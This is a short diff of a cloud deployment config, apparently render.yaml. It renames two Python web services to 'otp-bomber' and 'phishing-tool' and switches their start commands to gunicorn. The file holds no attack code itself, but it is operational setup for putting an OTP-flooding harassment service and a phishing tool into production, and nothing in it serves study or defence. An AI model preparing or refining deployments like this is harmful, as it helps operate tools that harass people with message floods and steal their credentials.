@@ -1,16 +1,14 @@
 services:
   - type: web
-    name: app-backend
+    name: otp-bomber
     runtime: python
     rootDir: backend
     buildCommand: pip install -r requirements.txt
-    startCommand: python app.py
+    startCommand: gunicorn app:app
 
   - type: web
-    name: app-phishing
+    name: phishing-tool
     runtime: python
     rootDir: phishing
     buildCommand: pip install -r requirements.txt
-    startCommand: python phis.py
-
-  # প্রয়োজনে আরও পরিষেবা যোগ করতে পারেন
+    startCommand: gunicorn phis:app
